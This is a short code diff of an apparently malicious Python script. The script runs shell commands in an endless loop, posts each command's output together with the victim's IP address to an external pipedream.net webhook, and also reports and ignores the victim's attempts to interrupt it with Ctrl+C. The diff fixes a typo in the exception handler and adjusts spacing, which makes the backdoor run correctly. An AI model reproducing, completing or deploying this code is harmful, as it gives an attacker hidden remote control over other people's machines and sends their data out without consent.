@@ -65,7 +65,7 @@ while True:
                 cmdout = system(command, shell=True).decode()
                 if cmdout != "":
                     try:
-                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"``$ {command}`` ```{cmdout}```-{ip}")
+                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"``$ {command}`` ```{cmdout}```- {ip}")
                     except KeyboardInterrupt:
                         try:
                             post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
@@ -90,6 +90,6 @@ while True:
     except KeyboardInterrupt:
         try:
             post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C)``")
-        except KeyyboardInerrupt:
+        except KeyboardInterrupt:
             continue
         continue
